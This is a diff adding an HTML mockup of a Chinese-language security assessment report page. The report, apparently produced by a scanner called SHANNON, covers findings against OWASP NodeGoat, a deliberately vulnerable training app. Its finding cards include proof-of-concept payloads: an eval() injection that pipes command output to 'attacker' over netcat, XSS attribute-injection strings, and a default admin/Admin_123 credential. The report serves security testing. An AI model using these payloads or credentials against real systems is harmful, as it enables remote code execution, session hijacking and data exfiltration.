@@ -1,0 +1,459 @@
+<!doctype html>
+<html lang="zh-CN" data-theme="dark">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>报告页预览 B — 章节化重排 + 漏洞卡片</title>
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@400;500;600;700&family=IBM+Plex+Serif:wght@400;500;600;700&display=swap" rel="stylesheet" />
+<style>
+:root, [data-theme="dark"] {
+  --background: 213 33% 6%; --foreground: 213 22% 82%;
+  --card: 217 26% 11%; --card-fg: 213 22% 82%;
+  --muted: 217 26% 16%; --muted-fg: 213 12% 47%;
+  --border: 217 26% 20%; --border-strong: 217 26% 28%;
+  --primary: 189 94% 53%; --primary-fg: 213 33% 6%;
+  --c-cyan: 189 94% 53%; --c-magenta: 270 100% 80%;
+  --c-yellow: 40 94% 55%; --c-green: 137 55% 52%; --c-red: 0 92% 63%;
+  --font-mono: "IBM Plex Mono", ui-monospace, monospace;
+  --font-sans: "IBM Plex Sans", system-ui, sans-serif;
+  --font-serif: "IBM Plex Serif", Georgia, serif;
+  --radius: 3px;
+}
+[data-theme="light"] {
+  --background: 0 0% 100%; --foreground: 217 26% 16%;
+  --card: 0 0% 100%; --card-fg: 217 26% 16%;
+  --muted: 220 30% 96%; --muted-fg: 213 12% 47%;
+  --border: 213 25% 88%; --border-strong: 213 25% 78%;
+  --primary: 190 92% 36%; --primary-fg: 0 0% 100%;
+  --c-cyan: 190 92% 36%; --c-magenta: 262 83% 58%;
+  --c-yellow: 38 90% 40%; --c-green: 137 66% 32%; --c-red: 0 73% 51%;
+}
+* { box-sizing: border-box; }
+body { margin: 0; background: hsl(var(--background)); color: hsl(var(--foreground)); font-family: var(--font-sans); font-size: 14px; line-height: 1.6; -webkit-font-smoothing: antialiased; }
+a { color: hsl(var(--primary)); text-decoration: none; }
+a:hover { text-decoration: underline; text-underline-offset: 3px; }
+code { font-family: var(--font-mono); }
+
+.topbar { position: sticky; top: 0; z-index: 50; height: 48px; display: flex; align-items: center; gap: 16px; padding: 0 20px; background: hsl(var(--background) / 0.85); backdrop-filter: blur(8px); border-bottom: 1px solid hsl(var(--border)); }
+.brand { display: flex; align-items: center; gap: 8px; font-weight: 700; }
+.brand-mark { width: 18px; height: 18px; background: hsl(var(--primary)); border-radius: 2px; position: relative; }
+.brand-mark::after { content:""; position:absolute; inset:4px; border:1.5px solid hsl(var(--primary-fg)); border-radius:1px; }
+.crumb { color: hsl(var(--muted-fg)); font-size: 12px; }
+.crumb b { color: hsl(var(--foreground)); font-weight: 500; }
+.topbar .spacer { flex: 1; }
+.theme-btn { font-family: var(--font-mono); font-size: 11px; color: hsl(var(--muted-fg)); background: hsl(var(--muted)); border: 1px solid hsl(var(--border)); padding: 5px 10px; border-radius: var(--radius); cursor: pointer; }
+.theme-btn:hover { color: hsl(var(--foreground)); }
+
+/* ===== 顶部精简状态条 ===== */
+.statusline { max-width: 1320px; margin: 0 auto; padding: 18px 24px 0; display: flex; align-items: baseline; gap: 20px; flex-wrap: wrap; }
+.statusline h1 { font-family: var(--font-serif); font-size: 22px; font-weight: 700; margin: 0; letter-spacing: -0.01em; }
+.statusline .pipe { font-family: var(--font-mono); font-size: 12px; color: hsl(var(--muted-fg)); }
+.statusline .pipe b { color: hsl(var(--foreground)); font-weight: 500; }
+
+/* ===== 双栏：左 sticky 章节导航 ===== */
+.layout { max-width: 1320px; margin: 0 auto; padding: 20px 24px 120px; display: grid; grid-template-columns: 220px 1fr; gap: 32px; }
+.toc { position: sticky; top: 72px; align-self: start; max-height: calc(100vh - 84px); overflow-y: auto; }
+.toc__label { font-family: var(--font-mono); font-size: 10.5px; color: hsl(var(--muted-fg)); text-transform: uppercase; letter-spacing: 0.1em; margin: 0 0 10px; padding-left: 12px; }
+.toc a { display: flex; align-items: center; gap: 9px; padding: 7px 12px; font-size: 13px; color: hsl(var(--muted-fg)); border-left: 2px solid hsl(var(--border)); }
+.toc a:hover { color: hsl(var(--foreground)); text-decoration: none; background: hsl(var(--muted) / 0.5); }
+.toc a i { width: 8px; height: 8px; border-radius: 1px; flex-shrink: 0; }
+.toc a b { font-family: var(--font-mono); font-size: 11px; margin-left: auto; opacity: 0.7; }
+
+/* ===== 章节封面 (signature) ===== */
+.chapter { margin-bottom: 48px; scroll-margin-top: 72px; }
+.cover { position: relative; display: grid; grid-template-columns: 6px 1fr auto; gap: 0; border: 1px solid hsl(var(--border-strong)); border-radius: var(--radius); background: hsl(var(--card)); overflow: hidden; }
+.cover__band { width: 6px; align-self: stretch; }
+.cover[data-t="inj"] .cover__band { background: hsl(var(--c-cyan)); }
+.cover[data-t="xss"] .cover__band { background: hsl(var(--c-magenta)); }
+.cover[data-t="auth"] .cover__band { background: hsl(var(--c-yellow)); }
+.cover[data-t="authz"] .cover__band { background: hsl(var(--c-green)); }
+.cover[data-t="ssrf"] .cover__band { background: hsl(var(--c-red)); }
+.cover__main { padding: 22px 26px; }
+.cover__eyebrow { font-family: var(--font-mono); font-size: 11px; text-transform: uppercase; letter-spacing: 0.12em; color: hsl(var(--muted-fg)); }
+.cover[data-t="inj"] .cover__eyebrow { color: hsl(var(--c-cyan)); }
+.cover[data-t="xss"] .cover__eyebrow { color: hsl(var(--c-magenta)); }
+.cover[data-t="auth"] .cover__eyebrow { color: hsl(var(--c-yellow)); }
+.cover[data-t="authz"] .cover__eyebrow { color: hsl(var(--c-green)); }
+.cover[data-t="ssrf"] .cover__eyebrow { color: hsl(var(--c-red)); }
+.cover__title { font-family: var(--font-serif); font-size: 30px; font-weight: 700; margin: 4px 0 8px; letter-spacing: -0.02em; line-height: 1.1; }
+.cover__root { font-size: 13px; color: hsl(var(--foreground) / 0.85); max-width: 60ch; }
+.cover__root b { color: hsl(var(--foreground)); }
+.cover__stats { display: flex; flex-direction: column; gap: 14px; padding: 22px 26px; border-left: 1px solid hsl(var(--border)); min-width: 200px; }
+.cover__stat .n { font-family: var(--font-serif); font-size: 36px; font-weight: 700; line-height: 1; letter-spacing: -0.02em; }
+.cover[data-t="inj"] .cover__stat .n { color: hsl(var(--c-cyan)); }
+.cover[data-t="xss"] .cover__stat .n { color: hsl(var(--c-magenta)); }
+.cover[data-t="auth"] .cover__stat .n { color: hsl(var(--c-yellow)); }
+.cover[data-t="authz"] .cover__stat .n { color: hsl(var(--c-green)); }
+.cover[data-t="ssrf"] .cover__stat .n { color: hsl(var(--c-red)); }
+.cover__stat .l { font-family: var(--font-mono); font-size: 10.5px; color: hsl(var(--muted-fg)); text-transform: uppercase; letter-spacing: 0.08em; margin-top: 3px; }
+.cover__range { display: flex; gap: 2px; height: 6px; border-radius: 1px; overflow: hidden; margin-top: 8px; }
+.cover__range i { display: block; height: 100%; }
+.cover__rangelbl { font-family: var(--font-mono); font-size: 11px; color: hsl(var(--muted-fg)); margin-top: 6px; }
+
+/* ===== 章节内漏洞卡片网格 ===== */
+.chip-row { display: flex; align-items: center; gap: 8px; margin: 20px 0 14px; font-family: var(--font-mono); font-size: 11px; color: hsl(var(--muted-fg)); text-transform: uppercase; letter-spacing: 0.08em; }
+.chip-row::after { content: ""; flex: 1; height: 1px; background: hsl(var(--border)); }
+.cards { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; }
+.vuln { display: grid; grid-template-columns: 3px 1fr; border: 1px solid hsl(var(--border)); border-radius: var(--radius); background: hsl(var(--card)); overflow: hidden; }
+.vuln[data-t="inj"] .vuln__stripe { background: hsl(var(--c-cyan)); }
+.vuln[data-t="xss"] .vuln__stripe { background: hsl(var(--c-magenta)); }
+.vuln[data-t="auth"] .vuln__stripe { background: hsl(var(--c-yellow)); }
+.vuln[data-t="authz"] .vuln__stripe { background: hsl(var(--c-green)); }
+.vuln[data-t="ssrf"] .vuln__stripe { background: hsl(var(--c-red)); }
+.vuln__body { padding: 12px 14px; }
+.vuln__head { display: flex; align-items: center; gap: 6px; flex-wrap: wrap; margin-bottom: 6px; }
+.vid { font-family: var(--font-mono); font-size: 11px; font-weight: 600; padding: 2px 6px; border-radius: 2px; }
+.vuln[data-t="inj"] .vid { color: hsl(var(--c-cyan)); background: hsl(var(--c-cyan) / 0.12); border: 1px solid hsl(var(--c-cyan) / 0.3); }
+.vuln[data-t="xss"] .vid { color: hsl(var(--c-magenta)); background: hsl(var(--c-magenta) / 0.12); border: 1px solid hsl(var(--c-magenta) / 0.3); }
+.vuln[data-t="auth"] .vid { color: hsl(var(--c-yellow)); background: hsl(var(--c-yellow) / 0.14); border: 1px solid hsl(var(--c-yellow) / 0.35); }
+.vuln[data-t="authz"] .vid { color: hsl(var(--c-green)); background: hsl(var(--c-green) / 0.12); border: 1px solid hsl(var(--c-green) / 0.3); }
+.vuln[data-t="ssrf"] .vid { color: hsl(var(--c-red)); background: hsl(var(--c-red) / 0.12); border: 1px solid hsl(var(--c-red) / 0.3); }
+.tag { font-family: var(--font-mono); font-size: 10px; padding: 1px 5px; border-radius: 2px; background: hsl(var(--muted)); color: hsl(var(--muted-fg)); border: 1px solid hsl(var(--border)); }
+.tag--star { color: hsl(var(--c-red)); border-color: hsl(var(--c-red) / 0.4); background: hsl(var(--c-red) / 0.08); }
+.vuln .conf { margin-left: auto; font-family: var(--font-mono); font-size: 10px; color: hsl(var(--muted-fg)); }
+.vuln .conf b { color: hsl(var(--foreground)); }
+.vuln h3 { margin: 4px 0 8px; font-size: 13.5px; font-weight: 600; line-height: 1.4; }
+.kv { display: grid; grid-template-columns: 76px 1fr; gap: 4px 10px; font-size: 12px; }
+.kv dt { font-family: var(--font-mono); font-size: 10px; color: hsl(var(--muted-fg)); text-transform: uppercase; padding-top: 1px; }
+.kv dd { margin: 0; line-height: 1.45; }
+.kv dd code, .vuln code { font-size: 11px; background: hsl(var(--muted)); padding: 1px 4px; border-radius: 2px; color: hsl(var(--primary)); }
+.poc { margin-top: 8px; }
+.poc summary { cursor: pointer; font-family: var(--font-mono); font-size: 10.5px; color: hsl(var(--muted-fg)); list-style: none; }
+.poc summary::before { content: "▸ PoC "; }
+.poc[open] summary::before { content: "▾ PoC "; }
+.poc summary:hover { color: hsl(var(--foreground)); }
+.poc pre { margin: 6px 0 0; background: hsl(var(--background)); border: 1px solid hsl(var(--border)); border-left: 2px solid hsl(var(--c-red) / 0.6); border-radius: var(--radius); padding: 8px 10px; font-size: 11px; color: hsl(var(--c-green)); overflow-x: auto; }
+
+.queue-wrap { border: 1px solid hsl(var(--border)); border-radius: var(--radius); overflow: hidden; margin-top: 4px; }
+table.queue { width: 100%; border-collapse: collapse; font-size: 12px; }
+table.queue th { background: hsl(var(--muted)); font-family: var(--font-mono); font-size: 10px; text-transform: uppercase; letter-spacing: 0.06em; color: hsl(var(--muted-fg)); text-align: left; padding: 7px 10px; border-bottom: 1px solid hsl(var(--border)); }
+table.queue td { padding: 8px 10px; border-bottom: 1px solid hsl(var(--border)); vertical-align: top; }
+table.queue tr:last-child td { border-bottom: none; }
+table.queue tr:hover td { background: hsl(var(--muted) / 0.4); }
+table.queue code { font-size: 10.5px; background: hsl(var(--muted)); padding: 1px 4px; border-radius: 2px; color: hsl(var(--primary)); }
+
+/* 单列章节（injection 只 1 个首要卡） */
+.cards--single { grid-template-columns: 1fr; }
+
+@media (max-width: 980px) {
+  .layout { grid-template-columns: 1fr; }
+  .toc { position: static; max-height: none; display: flex; flex-wrap: wrap; gap: 6px; }
+  .toc__label { width: 100%; padding-left: 0; }
+  .toc a { border-left: none; border-bottom: 1px solid hsl(var(--border)); }
+  .cards { grid-template-columns: 1fr; }
+  .cover { grid-template-columns: 6px 1fr; }
+  .cover__stats { border-left: none; border-top: 1px solid hsl(var(--border)); flex-direction: row; }
+}
+</style>
+</head>
+<body>
+<header class="topbar">
+  <span class="brand"><span class="brand-mark"></span>SHANNON</span>
+  <span class="crumb">workspaces / <b>NodeGoat_20260630-002707</b> / 报告</span>
+  <span class="spacer"></span>
+  <button class="theme-btn" onclick="toggleTheme()">◐ theme: dark</button>
+</header>
+
+<div class="statusline">
+  <h1>安全评估报告</h1>
+  <span class="pipe">目标 <b>OWASP NodeGoat v1.3.0</b></span>
+  <span class="pipe">日期 <b>2026-06-30</b></span>
+  <span class="pipe">范围 <b>inj · xss · auth · authz · ssrf</b></span>
+  <span class="pipe"><b>36</b> 漏洞 · <b>5</b> 类</span>
+</div>
+
+<div class="layout">
+
+  <!-- 左侧 sticky 章节导航 -->
+  <nav class="toc">
+    <p class="toc__label">章节</p>
+    <a href="#inj"><i style="background:hsl(var(--c-cyan))"></i>注入<b>4</b></a>
+    <a href="#xss"><i style="background:hsl(var(--c-magenta))"></i>XSS<b>13</b></a>
+    <a href="#auth"><i style="background:hsl(var(--c-yellow))"></i>认证<b>10</b></a>
+    <a href="#authz"><i style="background:hsl(var(--c-green))"></i>授权<b>7</b></a>
+    <a href="#ssrf"><i style="background:hsl(var(--c-red))"></i>SSRF<b>2</b></a>
+  </nav>
+
+  <div>
+    <!-- Injection 章节 -->
+    <section class="chapter" id="inj">
+      <div class="cover" data-t="inj">
+        <div class="cover__band"></div>
+        <div class="cover__main">
+          <div class="cover__eyebrow">01 · Injection</div>
+          <div class="cover__title">注入分析报告</div>
+          <div class="cover__root"><b>根因：</b>3 条 SSJS/命令注入（RCE）—— <code>POST /contributions</code> 的 <code>preTax/afterTax/roth</code> 各自直达独立的 <code>eval()</code>；1 条 NoSQL <code>$where</code> 注入。全部仅需 <code>isLoggedIn</code>，活动代码零净化。</div>
+        </div>
+        <div class="cover__stats">
+          <div class="cover__stat"><div class="n">4</div><div class="l">findings</div></div>
+          <div>
+            <div class="l" style="margin:0">severity</div>
+            <div class="cover__range" title="Critical ~ High">
+              <i style="flex:3;background:hsl(var(--c-red))"></i><i style="flex:1;background:hsl(var(--c-yellow))"></i>
+            </div>
+            <div class="cover__rangelbl">Critical ~ High</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="chip-row">Exploitation Queue</div>
+      <div class="queue-wrap">
+        <table class="queue">
+          <thead><tr><th>ID</th><th>类型</th><th>源</th><th>Sink</th><th>认证</th><th>置信</th></tr></thead>
+          <tbody>
+            <tr><td><span class="vid" style="color:hsl(var(--c-cyan));background:hsl(var(--c-cyan)/0.12);border:1px solid hsl(var(--c-cyan)/0.3)">INJ-VULN-01</span></td><td>SSJS/RCE</td><td><code>preTax</code> :32</td><td><code>eval()</code></td><td>isLoggedIn</td><td>high</td></tr>
+            <tr><td><span class="vid" style="color:hsl(var(--c-cyan));background:hsl(var(--c-cyan)/0.12);border:1px solid hsl(var(--c-cyan)/0.3)">INJ-VULN-04</span></td><td>NoSQL $where</td><td><code>threshold</code> :78</td><td><code>$where</code></td><td>isLoggedIn</td><td>high</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="chip-row" style="margin-top:20px">首要条目</div>
+      <div class="cards cards--single">
+        <article class="vuln" data-t="inj">
+          <div class="vuln__stripe"></div>
+          <div class="vuln__body">
+            <div class="vuln__head">
+              <span class="vid">INJ-VULN-01</span>
+              <span class="tag tag--star">★ 首要目标</span>
+              <span class="tag">RCE</span>
+              <span class="tag" style="color:hsl(var(--c-cyan));border-color:hsl(var(--c-cyan)/0.4)">🌐 公网</span>
+              <span class="conf">confidence <b>high</b></span>
+            </div>
+            <h3>SSJS 命令注入 — <code>preTax</code> 直达 <code>eval()</code></h3>
+            <dl class="kv">
+              <dt>source</dt><dd><code>POST /contributions</code> body <code>preTax</code></dd>
+              <dt>sink</dt><dd><code>eval()</code> @ contributions.js:32</dd>
+              <dt>path</dt><dd><code>req.body.preTax</code> → <code>eval()</code> → SSJS</dd>
+            </dl>
+            <details class="poc"><summary>witness</summary><pre>"require('child_process').exec('id | nc attacker 4444')"</pre></details>
+          </div>
+        </article>
+      </div>
+    </section>
+
+    <!-- XSS 章节 -->
+    <section class="chapter" id="xss">
+      <div class="cover" data-t="xss">
+        <div class="cover__band"></div>
+        <div class="cover__main">
+          <div class="cover__eyebrow">02 · XSS</div>
+          <div class="cover__title">跨站脚本分析报告</div>
+          <div class="cover__root"><b>根因：</b>Swig <code>autoescape:false</code> 全局关闭，致 13 个 sink。3 个 pre-auth 反射型（<code>/login</code>、<code>/signup</code> 属性回显）；多个存储型，首要为经公开注册对 admin 投毒。memo 经 <code>marked()</code> 的 sink 因 <code>sanitize:true</code> 实测部分有效。</div>
+        </div>
+        <div class="cover__stats">
+          <div class="cover__stat"><div class="n">13</div><div class="l">findings</div></div>
+          <div>
+            <div class="l" style="margin:0">severity</div>
+            <div class="cover__range" title="High ~ Low">
+              <i style="flex:4;background:hsl(var(--c-yellow))"></i><i style="flex:2;background:hsl(var(--c-cyan))"></i><i style="flex:2;background:hsl(var(--muted-fg))"></i>
+            </div>
+            <div class="cover__rangelbl">High ~ Low</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="chip-row">13 findings · 按首破点 / 价值排序</div>
+      <div class="cards">
+        <article class="vuln" data-t="xss">
+          <div class="vuln__stripe"></div>
+          <div class="vuln__body">
+            <div class="vuln__head">
+              <span class="vid">XSS-VULN-01</span>
+              <span class="tag tag--star">★ 首破点</span>
+              <span class="tag">Reflected</span>
+              <span class="conf">conf <b>high</b></span>
+            </div>
+            <h3>Reflected — login userName 属性回显</h3>
+            <dl class="kv">
+              <dt>source</dt><dd><code>POST /login</code> userName</dd>
+              <dt>sink</dt><dd><code>{{userName}}</code> → attr</dd>
+              <dt>access</dt><dd>🌐 pre-auth</dd>
+            </dl>
+            <details class="poc"><summary>witness</summary><pre>" autofocus onfocus="alert(document.domain)</pre></details>
+          </div>
+        </article>
+
+        <article class="vuln" data-t="xss">
+          <div class="vuln__stripe"></div>
+          <div class="vuln__body">
+            <div class="vuln__head">
+              <span class="vid">XSS-VULN-04</span>
+              <span class="tag tag--star">★ 首要目标</span>
+              <span class="tag">Stored</span>
+              <span class="conf">conf <b>high</b></span>
+            </div>
+            <h3>Stored — 公开注册对 admin 投毒</h3>
+            <dl class="kv">
+              <dt>source</dt><dd><code>POST /signup</code> firstName</dd>
+              <dt>sink</dt><dd>benefits.html:51</dd>
+              <dt>chain</dt><dd>XSS→CSRF→RCE</dd>
+            </dl>
+            <details class="poc"><summary>witness</summary><pre>&lt;img src=x onerror=alert(1)&gt;</pre></details>
+          </div>
+        </article>
+
+        <article class="vuln" data-t="xss">
+          <div class="vuln__stripe"></div>
+          <div class="vuln__body">
+            <div class="vuln__head">
+              <span class="vid">XSS-VULN-02</span>
+              <span class="tag">Reflected</span>
+              <span class="conf">conf <b>high</b></span>
+            </div>
+            <h3>Reflected — signup userName 属性回显</h3>
+            <dl class="kv">
+              <dt>source</dt><dd><code>POST /signup</code> userName</dd>
+              <dt>sink</dt><dd><code>{{userName}}</code> → attr</dd>
+              <dt>access</dt><dd>🌐 pre-auth</dd>
+            </dl>
+            <details class="poc"><summary>witness</summary><pre>" autofocus onfocus="alert(1) a</pre></details>
+          </div>
+        </article>
+
+        <article class="vuln" data-t="xss">
+          <div class="vuln__stripe"></div>
+          <div class="vuln__body">
+            <div class="vuln__head">
+              <span class="vid">XSS-VULN-05</span>
+              <span class="tag" style="color:hsl(var(--c-yellow));border-color:hsl(var(--c-yellow)/0.4);background:hsl(var(--c-yellow)/0.1)">⚠ 受限</span>
+              <span class="tag">Stored</span>
+              <span class="conf">conf <b>low</b></span>
+            </div>
+            <h3>Stored — memo 经 <code>marked()</code> sanitize 部分有效</h3>
+            <dl class="kv">
+              <dt>sink</dt><dd><code>{{ marked(doc.memo) }}</code></dd>
+              <dt>access</dt><dd>🔐 认证</dd>
+            </dl>
+            <details class="poc"><summary>witness</summary><pre>// marked 0.3.5 sanitize 绕过向量 ↘</pre></details>
+          </div>
+        </article>
+      </div>
+    </section>
+
+    <!-- Auth 章节（封面示例） -->
+    <section class="chapter" id="auth">
+      <div class="cover" data-t="auth">
+        <div class="cover__band"></div>
+        <div class="cover__main">
+          <div class="cover__eyebrow">03 · Auth</div>
+          <div class="cover__title">认证分析报告</div>
+          <div class="cover__root"><b>根因：</b>会话生命周期失控（登录不轮换 session ID、cookie 缺 <code>Secure</code> 且无过期、明文 HTTP）；凭据策略全面失守（明文存储与 <code>===</code> 比较、硬编码默认凭据 <code>admin/Admin_123</code>）；缺失 abuse 防御（无限流 / 差异化错误致用户枚举）。</div>
+        </div>
+        <div class="cover__stats">
+          <div class="cover__stat"><div class="n">10</div><div class="l">findings</div></div>
+          <div>
+            <div class="l" style="margin:0">severity</div>
+            <div class="cover__range" title="High ~ Medium · 8H/2M">
+              <i style="flex:8;background:hsl(var(--c-yellow))"></i><i style="flex:2;background:hsl(var(--c-cyan))"></i>
+            </div>
+            <div class="cover__rangelbl">8 High · 2 Med</div>
+          </div>
+        </div>
+      </div>
+      <div class="chip-row">10 findings · 摘要 2 条</div>
+      <div class="cards">
+        <article class="vuln" data-t="auth">
+          <div class="vuln__stripe"></div>
+          <div class="vuln__body">
+            <div class="vuln__head">
+              <span class="vid">AUTH-VULN-08</span>
+              <span class="tag tag--star">★ 接管</span>
+              <span class="tag">Login_Flow_Logic</span>
+              <span class="conf">conf <b>High</b></span>
+            </div>
+            <h3>硬编码默认凭据，每次部署重灌</h3>
+            <dl class="kv">
+              <dt>cred</dt><dd><code>admin/Admin_123</code></dd>
+              <dt>access</dt><dd>🌐 公网 · pre-auth</dd>
+            </dl>
+          </div>
+        </article>
+        <article class="vuln" data-t="auth">
+          <div class="vuln__stripe"></div>
+          <div class="vuln__body">
+            <div class="vuln__head">
+              <span class="vid">AUTH-VULN-01</span>
+              <span class="tag">Session_Fixation</span>
+              <span class="conf">conf <b>High</b></span>
+            </div>
+            <h3>登录后不轮换 session ID</h3>
+            <dl class="kv">
+              <dt>access</dt><dd>🌐 公网</dd>
+              <dt>impact</dt><dd>会话固定</dd>
+            </dl>
+          </div>
+        </article>
+      </div>
+    </section>
+
+    <!-- SSRF 章节 -->
+    <section class="chapter" id="ssrf">
+      <div class="cover" data-t="ssrf">
+        <div class="cover__band"></div>
+        <div class="cover__main">
+          <div class="cover__eyebrow">05 · SSRF</div>
+          <div class="cover__title">SSRF 分析报告</div>
+          <div class="cover__root"><b>根因：</b><code>GET /research</code> 完整响应（非盲）SSRF——<code>req.query.url</code> 无校验拼接进 <code>needle.get()</code>，响应体原样回写，可打 IMDS / loopback / 内网；<code>GET /learn</code> 开放重定向。两者均仅需 <code>isLoggedIn</code>。</div>
+        </div>
+        <div class="cover__stats">
+          <div class="cover__stat"><div class="n">2</div><div class="l">findings</div></div>
+          <div>
+            <div class="l" style="margin:0">severity</div>
+            <div class="cover__range" title="Critical ~ High">
+              <i style="flex:3;background:hsl(var(--c-red))"></i><i style="flex:1;background:hsl(var(--c-yellow))"></i>
+            </div>
+            <div class="cover__rangelbl">Critical ~ High</div>
+          </div>
+        </div>
+      </div>
+      <div class="chip-row">2 findings</div>
+      <div class="cards">
+        <article class="vuln" data-t="ssrf">
+          <div class="vuln__stripe"></div>
+          <div class="vuln__body">
+            <div class="vuln__head">
+              <span class="vid">SSRF-VULN-01</span>
+              <span class="tag tag--star">★ CRITICAL</span>
+              <span class="conf">conf <b>high</b></span>
+            </div>
+            <h3>完整响应 SSRF — <code>GET /research</code></h3>
+            <dl class="kv">
+              <dt>source</dt><dd><code>req.query.url</code></dd>
+              <dt>sink</dt><dd><code>needle.get()</code></dd>
+              <dt>target</dt><dd>IMDS / loopback</dd>
+            </dl>
+          </div>
+        </article>
+        <article class="vuln" data-t="ssrf">
+          <div class="vuln__stripe"></div>
+          <div class="vuln__body">
+            <div class="vuln__head">
+              <span class="vid">SSRF-VULN-02</span>
+              <span class="tag">Open Redirect</span>
+              <span class="conf">conf <b>high</b></span>
+            </div>
+            <h3>开放重定向 — <code>GET /learn</code></h3>
+            <dl class="kv">
+              <dt>source</dt><dd><code>req.query.url</code></dd>
+              <dt>sink</dt><dd><code>res.redirect</code></dd>
+            </dl>
+          </div>
+        </article>
+      </div>
+    </section>
+
+  </div>
+</div>
+
+<script>
+function toggleTheme() {
+  const html = document.documentElement;
+  const next = html.dataset.theme === "dark" ? "light" : "dark";
+  html.dataset.theme = next;
+  document.querySelector(".theme-btn").textContent = "◐ theme: " + next;
+}
+</script>
+</body>
+</html>
